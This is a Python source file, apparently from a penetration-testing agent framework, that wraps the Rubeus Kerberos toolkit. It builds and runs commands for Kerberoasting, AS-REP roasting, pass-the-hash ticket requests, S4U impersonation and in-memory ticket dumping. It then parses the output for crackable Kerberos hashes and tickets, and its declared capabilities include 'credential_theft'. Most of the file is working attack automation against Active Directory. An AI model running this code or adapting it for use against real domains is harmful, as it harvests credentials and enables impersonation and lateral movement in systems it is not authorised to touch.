from __future__ import annotations

import re
import subprocess
import tempfile
from typing import Any

from skoll_agent.engines.base_engine import BaseEngine, EngineResult


class RubeusEngine(BaseEngine):
    name = "rubeus"
    description = "Rubeus Kerberos toolkit. ASREP Roast, Kerberoasting, passthehash, passtheticket, silver ticket, golden ticket (via wine64 o Windows)."
    capabilities = ["ad_audit", "kerberos", "authentication", "active_directory", "credential_theft"]

    def scan(self, target: str, **kwargs: Any) -> EngineResult:
        findings = []
        raw_lines: list[str] = []

        domain = kwargs.get("domain", target)
        binary_path = kwargs.get("binary_path", "rubeus")
        timeout = int(kwargs.get("timeout", 60))
        command = kwargs.get("command", "kerberoast")
        user_tgt = kwargs.get("user_tgt", "")
        hash_ntlm = kwargs.get("hash_ntlm", "")
        spn_target = kwargs.get("spn", "")

        raw_lines.append(f"[INFO] Rubeus ejecutando: {command} en dominio {domain}")

        # Build Rubeus command
        rubeus_cmd = ""

        if command == "kerberoast":
            rubeus_cmd = f"kerberoast /nowrap"
            if kwargs.get("spn"):
                rubeus_cmd += f" /spn:\"{kwargs['spn']}\""
            raw_lines.append("[INFO] Kerberoasting via Rubeus...")

        elif command == "asreproast":
            rubeus_cmd = "asreproast /nowrap"
            raw_lines.append("[INFO] ASREP Roast via Rubeus...")

        elif command == "asktgt":
            if not user_tgt or not hash_ntlm:
                raw_lines.append("[WARN] asktgt requiere user_tgt y hash_ntlm")
                findings.append({
                    "file_path": target,
                    "line_start": 0, "line_end": 0,
                    "severity": "info",
                    "title": "Rubeus asktgt requiere hash",
                    "description": "Se necesita hash NTLM de usuario para asktgt",
                    "tool": self.name,
                    "rule_id": "rubeus-needs-hash",
                })
                return EngineResult(
                    success=False,
                    raw_output="rubeus: faltan parametros",
                    findings=findings,
                    summary="rubeus: faltan parametros",
                )
            rubeus_cmd = f"asktgt /user:{user_tgt} /domain:{domain} /ntlm:{hash_ntlm} /nowrap"
            raw_lines.append(f"[INFO] Solicitando TGT para {user_tgt}...")

        elif command == "asktgs":
            if not spn_target:
                raw_lines.append("[WARN] asktgs requiere spn")
                return EngineResult(success=False, raw_output="", summary="rubeus: falta SPN")
            rubeus_cmd = f"asktgs /service:{spn_target} /nowrap"
            raw_lines.append(f"[INFO] Solicitando TGS para {spn_target}...")

        elif command == "s4u":
            rubeus_cmd = f"s4u /user:{user_tgt} /nowrap"
            raw_lines.append(f"[INFO] S4U impersonation para {user_tgt}...")

        elif command == "tgtdeleg":
            rubeus_cmd = "tgtdeleg /nowrap"
            raw_lines.append("[INFO] TGT delegation...")

        elif command == "dump":
            rubeus_cmd = "dump /nowrap"
            raw_lines.append("[INFO] Dumpeando tickets Kerberos en memoria...")

        elif command == "triagedump":
            rubeus_cmd = "triagedump"
            raw_lines.append("[INFO] Triagedump de tickets...")

        else:
            rubeus_cmd = command
            raw_lines.append(f"[INFO] Comando personalizado: {command}")

        if not rubeus_cmd:
            raw_lines.append("[WARN] No hay comando Rubeus para ejecutar")
            return EngineResult(success=False, raw_output="", summary="rubeus: sin comando")

        # Execute via temp script
        try:
            with tempfile.NamedTemporaryFile(mode="w", suffix=".bat", delete=False) as f:
                script_path = f.name
                f.write(f"rubeus.exe {rubeus_cmd}\n")
                f.write("exit\n")

            # Try to run via wine64 (Linux) or natively (Windows)
            result = None
            try:
                result = subprocess.run(
                    [binary_path, rubeus_cmd],
                    capture_output=True, text=True, timeout=timeout,
                )
            except FileNotFoundError:
                try:
                    result = subprocess.run(
                        ["wine64", binary_path, rubeus_cmd],
                        capture_output=True, text=True, timeout=timeout,
                    )
                except FileNotFoundError:
                    raw_lines.append("[WARN] Rubeus no encontrado en PATH ni wine64")
                    findings.append({
                        "file_path": target,
                        "line_start": 0, "line_end": 0,
                        "severity": "info",
                        "title": "Rubeus no instalado",
                        "description": "Rubeus no esta disponible. Descargar de https://github.com/GhostPack/Rubeus",
                        "tool": self.name,
                        "rule_id": "rubeus-not-found",
                    })
                    return EngineResult(
                        success=False,
                        raw_output="rubeus: no encontrado",
                        findings=findings,
                        summary="rubeus: no instalado",
                    )

            stdout = result.stdout or ""
            stderr = result.stderr or ""

            if stdout:
                raw_lines.append(f"[INFO] Rubeus output: {len(stdout)} chars")
                raw_lines.append(f"  Output sample: {stdout[:1000]}")

                # Parse for TGT/TGS hashes
                if "$krb5asrep$" in stdout or "$krb5tgs$" in stdout:
                    hash_type = "ASREP" if "$krb5asrep$" in stdout else "TGS"
                    hashes = re.findall(r"\$krb5(?:asrep|tgs)\$.+?(?:\s|$)", stdout)

                    if hashes:
                        raw_lines.append(f"[CRITICAL] Rubeus: {len(hashes)} hashes {hash_type} obtenidos!")
                        for h in hashes[:5]:
                            user_m = re.search(r"\$krb5(?:asrep|tgs)\$\d+\$(.+?)(?:@|\$|:)", h)
                            user = user_m.group(1) if user_m else "unknown"
                            raw_lines.append(f"  → {user}: hash obtenido")
                            findings.append({
                                "file_path": target,
                                "line_start": 0, "line_end": 0,
                                "severity": "critical",
                                "title": f"Rubeus {hash_type}: hash de {user}",
                                "description": f"Hash {hash_type} obtenido via Rubeus para {user}@{domain}",
                                "tool": self.name,
                                "rule_id": f"rubeus-{hash_type.lower()}-{user.lower()}",
                                "username": user,
                                "hash_type": hash_type,
                                "domain": domain,
                            })

                # Parse for TGT (ticket)
                if "ticket.kirbi" in stdout.lower() or "base64" in stdout.lower() or "ticket:" in stdout.lower():
                    raw_lines.append("[INFO] Rubeus: ticket Kerberos obtenido")
                    findings.append({
                        "file_path": target,
                        "line_start": 0, "line_end": 0,
                        "severity": "high",
                        "title": "Ticket Kerberos obtenido via Rubeus",
                        "description": f"Se obtuvo un ticket Kerberos via Rubeus ({command}) en {domain}",
                        "tool": self.name,
                        "rule_id": f"rubeus-ticket-{command}",
                        "domain": domain,
                    })

                # Parse for triage results (users with tickets)
                if "User:" in stdout or "session" in stdout.lower():
                    users_in_triage = re.findall(r"User:\s*(\S+)", stdout)
                    if users_in_triage:
                        raw_lines.append(f"[INFO] Rubeus: {len(users_in_triage)} usuarios con tickets activos")
                        findings.append({
                            "file_path": target,
                            "line_start": 0, "line_end": 0,
                            "severity": "medium",
                            "title": f"Tickets Kerberos activos: {len(users_in_triage)} usuarios",
                            "description": f"Usuarios con tickets Kerberos activos en memoria: {', '.join(users_in_triage[:10])}",
                            "tool": self.name,
                            "rule_id": "rubeus-active-tickets",
                            "users": users_in_triage[:10],
                        })

            if stderr and "error" in stderr.lower():
                raw_lines.append(f"[ERR] Rubeus stderr: {stderr[:300]}")

        except subprocess.TimeoutExpired:
            raw_lines.append("[TIMEOUT] Rubeus timed out")
        except Exception as e:
            raw_lines.append(f"[ERR] Rubeus: {e}")

        summary = f"rubeus: {len(findings)} hallazgos"
        return EngineResult(
            success=True,
            raw_output="\n".join(raw_lines),
            findings=findings,
            summary=summary,
        )

    def parse_output(self, raw_output: str) -> list[dict[str, Any]]:
        return []
